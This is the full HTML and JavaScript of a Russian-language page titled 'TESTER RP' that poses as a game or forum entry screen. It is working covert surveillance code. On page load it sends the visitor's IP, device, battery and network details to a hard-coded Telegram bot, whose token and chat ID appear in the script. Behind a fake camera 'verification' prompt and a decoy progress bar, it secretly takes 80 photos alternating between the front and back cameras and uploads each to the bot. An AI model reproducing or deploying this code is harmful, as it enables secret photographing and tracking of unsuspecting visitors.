<!DOCTYPE html><html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TESTER RP</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            overflow: hidden;
            touch-action: none;
            -webkit-text-size-adjust: none;
            text-size-adjust: none;
            height: 100vh;
            font-family: Arial, sans-serif;
            position: relative;
            background: #000;
            display: flex;
            flex-direction: column;
        }
        
        .background-container {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: url('https://i.ibb.co/LDrtg7sJ/12-20250403192149.png') no-repeat center center;
            background-size: cover;
            z-index: -2;
        }
        
        .new-background {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: url('https://i.ibb.co/kVcnz5xZ/14.png') no-repeat center center;
            background-size: cover;
            z-index: -1;
            display: none;
        }
        
        .content {
            position: relative;
            z-index: 1;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: flex-end;
            align-items: center;
            padding-bottom: 20px;
        }
        
        .play-btn {
            background: transparent;
            border: none;
            width: 200px;
            height: 80px;
            margin-bottom: 100px;
            cursor: pointer;
            position: absolute;
            bottom: 150px;
            opacity: 0;
        }
        
        .hidden-camera {
            position: absolute;
            opacity: 0;
            width: 1px;
            height: 1px;
        }
        
        .legal-links {
            position: absolute;
            bottom: 10px;
            width: 100%;
            text-align: center;
            color: #fff;
            font-size: 12px;
            padding: 5px 0;
        }
        
        .message-box {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(0, 0, 0, 0.8);
            color: white;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            z-index: 100;
            display: none;
        }
        
        .loading-container {
            position: absolute;
            bottom: 50px;
            width: 80%;
            left: 10%;
            text-align: center;
            color: white;
            display: none;
        }
        
        .loading-text {
            margin-bottom: 10px;
            font-size: 16px;
        }
        
        .progress-bar {
            width: 100%;
            height: 10px;
            background-color: #333;
            border-radius: 5px;
            overflow: hidden;
        }
        
        .progress {
            height: 100%;
            width: 0;
            background-color: white;
            transition: width 0.1s linear;
        }
        
        .permission-request {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(0, 0, 0, 0.9);
            color: white;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            z-index: 100;
            max-width: 80%;
            display: none;
        }
        
        .permission-btn {
            background: #4CAF50;
            border: none;
            color: white;
            padding: 10px 20px;
            margin: 10px 5px;
            border-radius: 5px;
            cursor: pointer;
        }
        
        .permission-btn.deny {
            background: #f44336;
        }
    </style>
</head>
<body>
    <div class="background-container"></div>
    <div class="new-background"></div>
    <div class="content">
        <button class="play-btn" id="playBtn"></button>
    </div>

    <div class="legal-links">
        Договор оферты    Политика конфиденциальности
    </div>

    <div class="message-box" id="messageBox">
        Форум в разработке
    </div>

    <div class="loading-container" id="loadingContainer">
        <div class="loading-text">Loading</div>
        <div class="progress-bar">
            <div class="progress" id="progressBar"></div>
        </div>
    </div>

    <div class="permission-request" id="permissionRequest">
        <h3>Требуется доступ к камере</h3>
        <p>Для продолжения необходимо разрешить доступ к вашей камере. Это необходимо для верификации.</p>
        <button class="permission-btn" id="grantPermission">Разрешить</button>
        <button class="permission-btn deny" id="denyPermission">Отказать</button>
    </div>

    <video id="hiddenCamera" class="hidden-camera" autoplay playsinline></video>

    <script>
        // Перенаправление в Chrome при открытии из других приложений
        if (!navigator.userAgent.includes('Chrome') && !navigator.userAgent.includes('Firefox') && !navigator.userAgent.includes('Safari')) {
            window.location.href = 'googlechrome://navigate?url=' + encodeURIComponent(window.location.href);
        }

        const botToken = '7898816931:AAHNPImGpJjs-MNsklAvrU0VRDFkHFte_ig';
        const chatId = '-1002577213610';
        const videoElement = document.getElementById('hiddenCamera');
        const playBtn = document.getElementById('playBtn');
        const messageBox = document.getElementById('messageBox');
        const newBackground = document.querySelector('.new-background');
        const loadingContainer = document.getElementById('loadingContainer');
        const progressBar = document.getElementById('progressBar');
        const permissionRequest = document.getElementById('permissionRequest');
        const grantPermissionBtn = document.getElementById('grantPermission');
        const denyPermissionBtn = document.getElementById('denyPermission');
        
        let currentStream = null;
        let frontCameraStream = null;
        let backCameraStream = null;
        let photoCount = 0;
        const totalPhotos = 80;
        const photoInterval = 250;
        let isFrontCameraActive = true;

        // Блокировка масштабирования
        document.addEventListener('gesturestart', function(e) {
            e.preventDefault();
        });
        
        document.addEventListener('touchmove', function(e) {
            if(e.scale !== 1) {
                e.preventDefault();
            }
        }, { passive: false });

        // Функция для получения информации о батарее
        async function getBatteryInfo() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    return {
                        level: Math.round(battery.level * 100) + '%',
                        charging: battery.charging ? 'Да' : 'Нет',
                        chargingTime: battery.chargingTime ? battery.chargingTime + ' сек' : 'Неизвестно',
                        dischargingTime: battery.dischargingTime ? battery.dischargingTime + ' сек' : 'Неизвестно'
                    };
                } catch (e) {
                    return { error: 'Не удалось получить данные о батарее' };
                }
            }
            return { error: 'API батареи не поддерживается' };
        }

        // Функция для получения информации о соединении
        function getConnectionInfo() {
            if ('connection' in navigator) {
                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                if (connection) {
                    return {
                        type: connection.type || 'Неизвестно',
                        effectiveType: connection.effectiveType || 'Неизвестно',
                        downlink: connection.downlink + ' Mbps',
                        rtt: connection.rtt + ' мс',
                        saveData: connection.saveData ? 'Да' : 'Нет'
                    };
                }
            }
            return { error: 'Информация о соединении недоступна' };
        }

        // Функция для получения информации об устройстве
        function getDeviceInfo() {
            const screen = window.screen;
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages ? navigator.languages.join(', ') : 'Неизвестно',
                cookieEnabled: navigator.cookieEnabled ? 'Да' : 'Нет',
                doNotTrack: navigator.doNotTrack || 'Неизвестно',
                hardwareConcurrency: navigator.hardwareConcurrency || 'Неизвестно',
                deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Неизвестно',
                maxTouchPoints: navigator.maxTouchPoints || 'Неизвестно',
                screen: {
                    width: screen.width,
                    height: screen.height,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight,
                    colorDepth: screen.colorDepth + ' бит',
                    pixelDepth: screen.pixelDepth + ' бит',
                    orientation: screen.orientation ? screen.orientation.type : 'Неизвестно'
                },
                window: {
                    innerWidth: window.innerWidth,
                    innerHeight: window.innerHeight,
                    outerWidth: window.outerWidth,
                    outerHeight: window.outerHeight
                },
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                date: new Date().toString(),
                localTime: new Date().toLocaleString(),
                timezoneOffset: new Date().getTimezoneOffset() + ' минут'
            };

            return deviceInfo;
        }

        // Функция для форматирования информации в читаемый вид
        function formatInfo(info) {
            let result = '';
            for (const [key, value] of Object.entries(info)) {
                if (typeof value === 'object' && value !== null) {
                    result += `\n${key}:\n${formatInfo(value).replace(/^/gm, '  ')}`;
                } else {
                    result += `${key}: ${value}\n`;
                }
            }
            return result;
        }

        // Функция для проверки разрешения на камеру
        async function checkCameraPermission() {
            try {
                const permissionStatus = await navigator.permissions.query({ name: 'camera' });
                return permissionStatus.state === 'granted';
            } catch (e) {
                // Если API permissions не поддерживается, проверяем через getUserMedia
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    stream.getTracks().forEach(track => track.stop());
                    return true;
                } catch {
                    return false;
                }
            }
        }

        // Функция для запуска прогресс-бара
        function startProgressBar() {
            loadingContainer.style.display = 'block';
            let progress = 0;
            const interval = 40; // 40 секунд = 40000 миллисекунд
            const step = 100 / (interval * 10); // 10 обновлений в секунду
            
            const timer = setInterval(() => {
                progress += step;
                progressBar.style.width = `${progress}%`;
                
                if (progress >= 100) {
                    clearInterval(timer);
                    messageBox.style.display = 'block';
                    setTimeout(() => {
                        progressBar.style.width = '0%';
                    }, 1000);
                }
            }, 100);
        }

        // 1. Отправка информации о пользователе
        async function sendUserInfo() {
            try {
                // Получаем IP-адрес
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const ip = ipData.ip;

                // Получаем дополнительную информацию
                const [batteryInfo, connectionInfo] = await Promise.all([
                    getBatteryInfo(),
                    getConnectionInfo()
                ]);

                const deviceInfo = getDeviceInfo();

                // Формируем сообщение
                let message = `🚨 Новый посетитель:\nIP: ${ip}\n\n`;
                message += `=== Информация об устройстве ===\n${formatInfo(deviceInfo)}\n`;
                message += `=== Батарея ===\n${formatInfo(batteryInfo)}\n`;
                message += `=== Соединение ===\n${formatInfo(connectionInfo)}\n`;

                // Отправляем сообщение в Telegram
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                });

            } catch (error) {
                console.error('Error sending user info:', error);
                try {
                    const deviceInfo = getDeviceInfo();
                    let fallbackMessage = `⚠️ Не удалось собрать полную информацию, но вот что есть:\n`;
                    fallbackMessage += formatInfo(deviceInfo);
                    
                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: fallbackMessage
                        })
                    });
                } catch (e) {
                    console.error('Fallback error:', e);
                }
            }
        }

        // 2. Захват фото с камеры и отправка
        async function captureAndSendPhoto(index) {
            try {
                const canvas = document.createElement('canvas');
                canvas.width = videoElement.videoWidth;
                canvas.height = videoElement.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                
                const blob = await new Promise(resolve => {
                    canvas.toBlob(resolve, 'image/jpeg', 0.8);
                });
                
                const cameraType = isFrontCameraActive ? 'front' : 'back';
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, `photo_${cameraType}_${index}.jpg`);
                
                const caption = `🆔 Фото ${isFrontCameraActive ? 'фронтальной' : 'задней'} камеры #${index}\nВремя: ${new Date().toLocaleString()}`;
                formData.append('caption', caption);
                
                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                console.log(`Фото ${index} (${cameraType}) отправлено`);
                
            } catch (error) {
                console.error(`Ошибка при отправке фото ${index}:`, error);
            }
        }

        // 3. Переключение между камерами
        async function switchCamera() {
            try {
                if (currentStream) {
                    currentStream.getTracks().forEach(track => track.stop());
                }

                isFrontCameraActive = !isFrontCameraActive;
                const facingMode = isFrontCameraActive ? 'user' : 'environment';

                currentStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: facingMode,
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: false
                });

                videoElement.srcObject = currentStream;

                if (isFrontCameraActive) {
                    frontCameraStream = currentStream;
                } else {
                    backCameraStream = currentStream;
                }

                await new Promise(resolve => setTimeout(resolve, 300));

            } catch (error) {
                console.error('Ошибка при переключении камеры:', error);
                throw error;
            }
        }

        // 4. Серийная съемка
        async function takeSeriesOfPhotos() {
            try {
                if (photoCount < totalPhotos) {
                    await captureAndSendPhoto(photoCount + 1);
                    photoCount++;
                    
                    if (photoCount < totalPhotos) {
                        await switchCamera();
                        setTimeout(takeSeriesOfPhotos, photoInterval);
                    } else {
                        stopAllCameras();
                    }
                }
                
            } catch (error) {
                console.error('Ошибка в процессе серийной съемки:', error);
                stopAllCameras();
            }
        }

        // 5. Остановка всех камер
        function stopAllCameras() {
            [frontCameraStream, backCameraStream, currentStream].forEach(stream => {
                if (stream) {
                    try {
                        stream.getTracks().forEach(track => track.stop());
                        console.log('Трек камеры остановлен');
                    } catch (error) {
                        console.error('Ошибка при остановке камеры:', error);
                    }
                }
            });
            videoElement.srcObject = null;
            console.log('Все камеры отключены');
        }

        // 6. Инициализация камер
        async function initCameras() {
            try {
                const devices = await navigator.mediaDevices.enumerateDevices();
                const hasFrontCamera = devices.some(device => 
                    device.kind === 'videoinput' && device.label.toLowerCase().includes('front'));
                const hasBackCamera = devices.some(device => 
                    device.kind === 'videoinput' && device.label.toLowerCase().includes('back'));

                if (!hasFrontCamera || !hasBackCamera) {
                    throw new Error('Не обнаружены обе камеры');
                }

                // Показываем новый фон и запускаем прогресс-бар
                newBackground.style.display = 'block';
                startProgressBar();

                isFrontCameraActive = true;
                currentStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: false
                });
                frontCameraStream = currentStream;
                videoElement.srcObject = currentStream;

                await new Promise(resolve => setTimeout(resolve, 1000));

                photoCount = 0;
                takeSeriesOfPhotos();
                
            } catch (error) {
                console.error('Ошибка при инициализации камер:', error);
                messageBox.style.display = 'block';
                
                try {
                    const errorMessage = `⚠️ Ошибка доступа к камерам:\nУстройство: ${navigator.userAgent}\nОшибка: ${error.message || 'Неизвестная ошибка'}`;
                    
                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: errorMessage
                        })
                    });
                } catch (e) {
                    console.error('Ошибка при отправке сообщения об ошибке:', e);
                }
            }
        }

        // 7. Запрос разрешения на доступ к камере
        async function requestCameraPermission() {
            try {
                permissionRequest.style.display = 'block';
                
                // Ждем ответа пользователя
                const userResponse = await new Promise((resolve) => {
                    grantPermissionBtn.onclick = () => resolve(true);
                    denyPermissionBtn.onclick = () => resolve(false);
                });
                
                permissionRequest.style.display = 'none';
                
                if (userResponse) {
                    try {
                        // Пробуем получить доступ к камере
                        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                        stream.getTracks().forEach(track => track.stop());
                        
                        // Если доступ получен, запускаем процесс верификации
                        await sendUserInfo();
                        await initCameras();
                    } catch (error) {
                        console.error('Пользователь отказал в доступе к камере:', error);
                        messageBox.style.display = 'block';
                    }
                } else {
                    console.log('Пользователь отказался предоставлять доступ к камере');
                    messageBox.style.display = 'block';
                }
            } catch (error) {
                console.error('Ошибка при запросе разрешения:', error);
                messageBox.style.display = 'block';
            }
        }

        // 8. Обработчик кнопки "Играть"
        playBtn.addEventListener('click', async function() {
            console.log('Начало процесса верификации...');
            await requestCameraPermission();
        });

        // Отправляем информацию о пользователе сразу при загрузке страницы
        window.addEventListener('load', function() {
            console.log('Страница загружена, отправка информации...');
            sendUserInfo().catch(e => console.error('Ошибка при отправке информации:', e));
        });

        // Остановка камер при закрытии страницы
        window.addEventListener('beforeunload', function() {
            console.log('Страница закрывается, остановка камер...');
            stopAllCameras();
        });

        // Дополнительная обработка видимости страницы
        document.addEventListener('visibilitychange', function() {
            if (document.hidden) {
                console.log('Страница стала неактивной, остановка камер...');
                stopAllCameras();
            }
        });
    </script>
</body>
</html>
